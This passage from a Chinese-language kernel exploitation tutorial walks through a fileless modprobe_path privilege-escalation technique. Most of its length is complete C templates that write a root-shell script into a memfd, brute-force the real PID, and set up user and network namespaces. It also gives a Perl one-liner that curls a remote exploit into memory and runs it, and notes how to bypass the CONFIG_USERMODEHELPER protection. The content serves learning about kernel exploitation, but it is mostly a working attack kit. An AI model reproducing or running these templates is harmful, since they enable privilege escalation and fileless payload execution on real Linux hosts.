<p>这个文件的内容主要是创建一个 <code>/bin/sh</code> 进程，并将输入输出重定向到 exp 的标准输入输出。</p>
<p>除此之外，触发 <code>modprobe</code> 的 <code>trigger</code> 文件也可以是内存文件。因此漏洞利用模板如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;limits.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">modprobe_trigger_memfd</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> *argv_envp = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd = memfd_create(<span class="string">&quot;&quot;</span>, MFD_CLOEXEC);</span><br><span class="line">    write(fd, <span class="string">&quot;\xFF\xFF\xFF\xFF&quot;</span>, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    fexecve(fd, &amp;argv_envp, &amp;argv_envp);</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">pid_t</span> pid = getpid();</span><br><span class="line">    <span class="type">char</span> modprobe_path[PATH_MAX];</span><br><span class="line">    <span class="type">int</span> modprobe_fd = memfd_create(<span class="string">&quot;&quot;</span>, MFD_CLOEXEC);</span><br><span class="line">    <span class="built_in">snprintf</span>(modprobe_path, <span class="keyword">sizeof</span>(modprobe_path), <span class="string">&quot;/proc/%u/fd/%u&quot;</span>, pid, modprobe_fd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 覆盖 `modprobe_path` 内核变量为 `&quot;/proc/&lt;pid&gt;/fd/&lt;script_fd&gt;&quot;`</span></span><br><span class="line">    <span class="type">char</span> *priv_cmd;</span><br><span class="line">    asprintf(&amp;priv_cmd, <span class="string">&quot;sudo sh -c &#x27;echo \&quot;%s\&quot; &gt; /proc/sys/kernel/modprobe&#x27;&quot;</span>, modprobe_path);</span><br><span class="line">    system(priv_cmd);</span><br><span class="line">    <span class="built_in">free</span>(priv_cmd);</span><br><span class="line"></span><br><span class="line">    lseek(modprobe_fd, <span class="number">0</span>, SEEK_SET);</span><br><span class="line">    dprintf(modprobe_fd, <span class="string">&quot;#!/bin/sh\necho /sbin/modprobe&gt;/proc/sys/kernel/modprobe\n/bin/sh 0&lt;/proc/%u/fd/0 1&gt;/proc/%u/fd/1 2&gt;&amp;1\n&quot;</span>, pid, pid);</span><br><span class="line"></span><br><span class="line">    modprobe_trigger_memfd();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>最后借助 <code>perl</code>，我们可以将远程的 exp 下载为内存文件并执行，从而真正实现无文件提权。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;</span></span><br><span class="line"><span class="string">  require qw/syscall.ph/;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  my $fd = syscall(SYS_memfd_create(), $fn, 0);</span></span><br><span class="line"><span class="string">  open(my $fh, &quot;&gt;&amp;=&quot;.$fd);</span></span><br><span class="line"><span class="string">  print $fh `curl https://example.com/exploit -s`;</span></span><br><span class="line"><span class="string">  exec &#123;&quot;/proc/$$/fd/$fd&quot;&#125; &quot;memfd&quot;;</span></span><br><span class="line"><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>前面提到 <code>getpid</code> 系统调用获取到的 <code>pid</code> 不一定是进程真正的 <code>pid</code>。比如如果这个进程处在 PID 命名空间中，那么 <code>getpid</code> 获取到的进程号是命名空间中的进程号。<strong>而报暴露 <code>/proc</code> 目录下的匿名内存文件的路径上的 <code>pid</code> 是真实的 <code>pid</code> 。</strong></p>
<p>真实的 <code>pid</code> 可以在进入命名空间之前通过 <code>getpid</code> 获取，然而如果这个进程本身就是在命名空间中启动的，那么就无法通过 <code>getpid</code> 获取真实的 <code>pid</code>。</p>
<p>一种方法是直接暴力枚举 <code>pid</code> 测试。此时需要通过一个 <code>status</code> 文件来检测是否枚举到了正确的 <code>pid</code> 从而跳出循环。我们在 <code>modprobe</code> 脚本中添加一句 <code>echo -n 1 1&gt;/proc/&lt;exploit_pid&gt;/fd/&lt;status_fd&gt;</code>，然后在 exp 中判断 <code>read(status_fd, &amp;status_cnt, 1)</code> 的读入长度是否为 1 来确定是否枚举到了正确的 <code>pid</code>。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;limits.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_progress_bar</span><span class="params">(<span class="type">int</span> current, <span class="type">int</span> total)</span> &#123;</span><br><span class="line">    <span class="type">int</span> progress = (current * <span class="number">100</span>) / total;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> bar_width = <span class="number">50</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> pos = (progress * bar_width) / <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\rProgress: [&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; bar_width; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; pos) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;=&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;] %d%% (%d/%d)&quot;</span>, progress, current, total);</span><br><span class="line"></span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">modprobe_trigger_memfd</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="type">char</span> *argv_envp = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    fd = memfd_create(<span class="string">&quot;&quot;</span>, MFD_CLOEXEC);</span><br><span class="line">    write(fd, <span class="string">&quot;\xff\xff\xff\xff&quot;</span>, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    fexecve(fd, &amp;argv_envp, &amp;argv_envp);</span><br><span class="line"></span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> shell_stdin_fd = dup(STDIN_FILENO);</span><br><span class="line">    <span class="type">int</span> shell_stdout_fd = dup(STDOUT_FILENO);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> modprobe_script_fd = memfd_create(<span class="string">&quot;&quot;</span>, MFD_CLOEXEC);</span><br><span class="line">    <span class="type">int</span> status_fd = memfd_create(<span class="string">&quot;&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">pid_t</span> max_pid = <span class="number">4194304</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] overwriting path with PIDs in range 0-&gt;%d...\n&quot;</span>, max_pid);</span><br><span class="line">    <span class="type">char</span> modprobe_path[PATH_MAX];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">pid_t</span> pid_guess = <span class="number">0</span>; pid_guess &lt; max_pid; pid_guess++) &#123;</span><br><span class="line">        print_progress_bar(pid_guess, max_pid);</span><br><span class="line">        <span class="built_in">snprintf</span>(modprobe_path, <span class="keyword">sizeof</span>(modprobe_path), <span class="string">&quot;/proc/%u/fd/%u&quot;</span>, pid_guess, modprobe_script_fd);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 覆盖 `modprobe_path` 内核变量为 `&quot;/proc/&lt;pid&gt;/fd/&lt;script_fd&gt;&quot;`</span></span><br><span class="line">        <span class="type">char</span> *priv_cmd;</span><br><span class="line">        asprintf(&amp;priv_cmd, <span class="string">&quot;sudo sh -c &#x27;echo \&quot;%s\&quot; &gt; /proc/sys/kernel/modprobe&#x27;&quot;</span>, modprobe_path);</span><br><span class="line">        system(priv_cmd);</span><br><span class="line">        <span class="built_in">free</span>(priv_cmd);</span><br><span class="line"></span><br><span class="line">        lseek(modprobe_script_fd, <span class="number">0</span>, SEEK_SET);</span><br><span class="line">        dprintf(modprobe_script_fd,</span><br><span class="line">                <span class="string">&quot;#!/bin/sh\necho /sbin/modprobe&gt;/proc/sys/kernel/modprobe\necho -n 1 1&gt;/proc/%u/fd/%u\n/bin/sh 0&lt;/proc/%u/fd/%u 1&gt;/proc/%u/fd/%u 2&gt;&amp;1\n&quot;</span>,</span><br><span class="line">                pid_guess, status_fd, pid_guess, shell_stdin_fd, pid_guess, shell_stdout_fd);</span><br><span class="line"></span><br><span class="line">        modprobe_trigger_memfd();</span><br><span class="line">        <span class="type">size_t</span> status_cnt = read(status_fd, &amp;status_cnt, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (status_cnt == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] successfully breached the mainframe as real-PID %u\n&quot;</span>, pid_guess);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="CONFIG-USERMODEHELPER"><a href="#CONFIG-USERMODEHELPER" class="headerlink" title="CONFIG_USERMODEHELPER"></a>CONFIG_USERMODEHELPER</h4><p><code>CONFIG_USERMODEHELPER</code> 是 Linux 内核的一个配置选项，控制着内核是否允许通过用户空间辅助程序来处理特定的内核事件。</p>
<p>通常内核会通过执行用户空间的程序来处理一些特定的事务，例如执行 <code>/sbin/modprobe</code> 来处理用户执行无效文件的情况。然而这种行为非常危险，因为一些内核漏洞可能会篡改内核中记录的这些用户程序的路径指向自己的恶意程序从而实现提权的目的。针对这一情况就有了 <code>CONFIG_USERMODEHELPER</code> 这一保护措施。</p>
<p>通常 <code>CONFIG_USERMODEHELPER</code> 选项会做如下配置：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_USERMODEHELPER=y</span><br><span class="line">CONFIG_STATIC_USERMODEHELPER_PATH=&quot;/sbin/usermode-helper&quot;</span><br></pre></td></tr></table></figure></div>

<p>类似于 <code>busybox</code>，内核会通过第一个参数传递要执行的程序路径到 <code>usermode-helper</code>，而该 <code>usermode-helper</code> 的行为取决于传递的 <code>argv[0]</code> 文件名。因此，即使我们覆盖了 <code>modprobe_path</code>，也只有 <code>argv[0]</code> 的值发生了变化， <code>usermode-helper</code> 无法识别这个值，因此不会执行。</p>
<p>不过我们可以通过直接覆盖内核中的 <code>/sbin/usermode-helper</code> 字符串来实现这一保护的绕过。</p>
<h2 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h2><p>Linux 命名空间（Namespace）是 Linux 内核提供的一种机制，它可以将系统资源隔离为不同的命名空间，使得多个进程可以共享同一系统上的资源，同时又互相隔离。命名空间是 Linux 容器（如 Docker、LXC）和虚拟化技术的核心概念之一。</p>
<h3 id="常见命名空间"><a href="#常见命名空间" class="headerlink" title="常见命名空间"></a>常见命名空间</h3><ul>
<li><strong>PID 命名空间</strong>：每个命名空间中的进程有自己独立的进程 ID（PID）。不同命名空间中的进程可以有相同的 PID，不会发生冲突。</li>
<li><strong>网络命名空间（Net Namespace）</strong>：不同的网络命名空间可以拥有自己的网络设备、路由表、iptables 配置等。每个网络命名空间中的进程看不到其他命名空间中的网络资源。</li>
<li><strong>挂载命名空间（Mount Namespace）</strong>：挂载命名空间为每个命名空间提供独立的文件系统视图。每个命名空间中的进程对挂载点和文件系统的变化都是独立的。</li>
<li><strong>UTS 命名空间</strong>：每个命名空间中的进程可以拥有自己独立的主机名（hostname）和域名（domainname），从而实现不同命名空间中进程的名称隔离。</li>
<li><strong>IPC 命名空间</strong>：提供独立的进程间通信（IPC）机制，包括信号量、消息队列和共享内存。不同的命名空间中的进程无法相互访问这些 IPC 资源。</li>
<li><strong>用户命名空间（User Namespace）</strong>：用户命名空间可以为每个命名空间中的进程提供不同的用户和组 ID（UID&#x2F;GID）映射。这样，进程可以在命名空间中以 root 权限运行，但在宿主机上却没有实际的 root 权限。</li>
<li><strong>时间命名空间（Time Namespace）</strong>：提供独立的系统时间视图。每个命名空间中的进程可以有自己的系统时间，与其他命名空间中的进程独立。</li>
<li><strong>Cgroup 命名空间（Cgroup Namespace）</strong>：Cgroup 命名空间用于隔离资源的限制，例如 CPU、内存和 I&#x2F;O。它提供了进程之间对资源的独立管理视图。</li>
</ul>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content">
      <p>kernel pwn 中最常用的命名空间是<strong>网络命名空间（Net Namespace）</strong>和<strong>用户命名空间（User Namespace）</strong>。这两个命名空间的主要作用是让我们可以完成一些 root 权限用户才能完成的操作。虽然这些操作被隔离在命名空间中，但是这些操作对内核空间的“影响”却是真实存在的。</p>
<p>我们可以通过如下命令检查是否启用了非特权用户命名空间。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sysctl kernel.unprivileged_userns_clone</span><br><span class="line">kernel.unprivileged_userns_clone = 1</span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<h3 id="命名空间切换"><a href="#命名空间切换" class="headerlink" title="命名空间切换"></a>命名空间切换</h3><h4 id="unshare-系统调用"><a href="#unshare-系统调用" class="headerlink" title="unshare 系统调用"></a>unshare 系统调用</h4><p><code>unshare</code> 是一个用于 Linux 系统中进程命名空间（Namespace）管理的系统调用，它允许进程在不创建新进程的情况下分离或隔离其资源。通过 <code>unshare</code>，进程可以断开与当前进程空间的关联，创建新的命名空间，从而在该命名空间内独立运行。</p>
<p><code>unshare</code> 系统调用的函数原型如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">unshare</span><span class="params">(<span class="type">int</span> flags)</span>;</span><br></pre></td></tr></table></figure></div>

<p><strong>参数</strong></p>
<ul>
<li><code>flags</code>：这是一个位掩码（bitmask），用来指定进程要分离哪些资源。<code>unshare</code> 将把当前进程从指定的命名空间中分离出来并将其移入一个新的命名空间。不同的标志位对应不同类型的命名空间。<ul>
<li><strong><code>CLONE_NEWUSER</code></strong>: 创建一个新的用户命名空间，允许设置 UID&#x2F;GID 映射。</li>
<li><strong><code>CLONE_NEWNET</code></strong>: 创建一个新的网络命名空间，允许网络配置和网络设备的隔离。</li>
</ul>
</li>
</ul>
<p><strong>返回值</strong></p>
<ul>
<li><p>成功: 返回 0。</p>
</li>
<li><p>失败: 返回 -1，并且设置 <code>errno</code> 来指示错误原因。</p>
</li>
</ul>
<p>通常我们会借助 <code>unshare</code> 系统调用创建并进入网络和用户命名空间，从而能够完成一些 root 权限用户才能完成的操作。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">do_unshare</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> retv;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] creating user namespace (CLONE_NEWUSER)...\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 单独执行 unshare 以便调试更容易</span></span><br><span class="line">    retv = unshare(CLONE_NEWUSER);</span><br><span class="line">    <span class="keyword">if</span> (retv == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;unshare(CLONE_NEWUSER)&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] creating network namespace (CLONE_NEWNET)...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    retv = unshare(CLONE_NEWNET);</span><br><span class="line">    <span class="keyword">if</span> (retv == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;unshare(CLONE_NEWNET)&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>然而这样进入命名空间之后权限是 <code>65534</code>（<code>nobody</code> 用户）。这是因为进程进入命名空间之后没有在 <code>/proc/self/uid_map</code> 和 <code>/proc/self/gid_map</code> 文件配置权限的映射关系，导致系统不知道原本的权限在新的命名空间中对应什么权限，因此设置为默认的 nobody 权限。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid=65534(nobody) gid=65534(nogroup) <span class="built_in">groups</span>=65534(nogroup)</span><br></pre></td></tr></table></figure></div>

<p><code>/proc/self/uid_map</code>、<code>/proc/self/setgroups</code> 和 <code>/proc/self/gid_map</code> 是 Linux 系统中与用户命名空间（User Namespace）相关的虚拟文件，用于控制和配置进程的用户（UID）和组（GID）映射。</p>
<table>
<thead>
<tr>
<th>文件路径</th>
<th>功能</th>
<th align="left">格式及作用</th>
</tr>
</thead>
<tbody><tr>
<td><code>/proc/self/setgroups</code></td>
<td>控制是否允许修改组成员信息</td>
<td align="left"><code>deny</code>（禁止修改组信息）或 <code>allow</code>（允许修改组信息）</td>
</tr>
<tr>
<td><code>/proc/self/uid_map</code></td>
<td>配置 UID 映射</td>
<td align="left"><code>&lt;new-uid&gt; &lt;old-uid&gt; &lt;range&gt;</code>：将宿主系统 UID 映射到命名空间 UID</td>
</tr>
<tr>
<td><code>/proc/self/gid_map</code></td>
<td>配置 GID 映射</td>
<td align="left"><code>&lt;new-gid&gt; &lt;old-gid&gt; &lt;range&gt;</code>：将宿主系统 GID 映射到命名空间 GID</td>
</tr>
</tbody></table>
<p>因此我们只需要把原本的 <code>pid</code> 和 <code>uid</code> 映射到 0 即可在命名空间中拥有“root 权限”。</p>

  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content">
      <p>需要先将 <code>/proc/self/setgroups</code> 设置为 <code>deny</code>（禁止修改组信息）否则后续对 <code>/proc/self/gid_map</code> 的修改会失败。</p>
<p>这是因为当进行 UID&#x2F;GID 映射时，如果没有禁用附加组修改（即不将 <code>setgroups</code> 设置为 <code>&quot;deny&quot;</code>），内核可能会试图修改附加组列表。这会与 UID&#x2F;GID 映射操作冲突，导致 GID 映射失败。</p>

    </div>
  </div>

<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">configure_uid_map</span><span class="params">(<span class="type">uid_t</span> old_uid, <span class="type">gid_t</span> old_gid)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] setting up UID namespace...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置 &quot;deny&quot; 禁止修改组信息</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] denying namespace rights to set user groups...\n&quot;</span>);</span><br><span class="line">    <span class="type">int</span> setgroups_fd = open(<span class="string">&quot;/proc/self/setgroups&quot;</span>, O_WRONLY);</span><br><span class="line">    dprintf(setgroups_fd, <span class="string">&quot;deny&quot;</span>);</span><br><span class="line">    close(setgroups_fd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 写入 UID 映射，将旧的 UID 映射到 UID 0</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] mapping uid %d to namespace uid 0...\n&quot;</span>, old_uid);</span><br><span class="line">    <span class="type">int</span> uid_fd = open(<span class="string">&quot;/proc/self/uid_map&quot;</span>, O_WRONLY);</span><br><span class="line">    dprintf(uid_fd, <span class="string">&quot;0 %d 1\n&quot;</span>, old_uid);</span><br><span class="line">    close(uid_fd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 写入 GID 映射</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] mapping gid %d to namespace gid 0...\n&quot;</span>, old_gid);</span><br><span class="line">    <span class="type">int</span> gid_fd = open(<span class="string">&quot;/proc/self/gid_map&quot;</span>, O_WRONLY);</span><br><span class="line">    dprintf(gid_fd, <span class="string">&quot;0 %d 1\n&quot;</span>, gid);</span><br><span class="line">    close(gid_fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>为了方便起见，这两部分代码可以整合在一起。这样直接在一开始调用这个函数即可。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">setup_unshare</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">__uid_t</span> uid = getuid();</span><br><span class="line">    <span class="type">__gid_t</span> gid = getgid();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] creating user namespace (CLONE_NEWUSER)...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (unshare(CLONE_NEWUSER) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;unshare(CLONE_NEWUSER)&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span 